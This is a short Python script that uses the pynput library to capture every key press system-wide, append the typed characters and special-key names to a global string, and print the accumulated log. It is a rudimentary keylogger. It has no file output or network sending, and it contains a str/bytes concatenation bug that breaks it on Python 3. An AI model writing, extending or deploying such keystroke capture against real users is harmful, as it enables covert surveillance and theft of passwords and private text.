import pynput.keyboard as pynput

log = ""

def callback_function(key):
    global log

    try:
        log = log + key.char.encode("utf8")

    except AttributeError:
        if (key == key.enter):
            log = log + "\n"
        elif (key == key.space):
            log = log + " "
        else:
            log = log + str(key)

    print(log)

keyboard_listener = pynput.Listener(on_press=callback_function)

with keyboard_listener:
    keyboard_listener.join()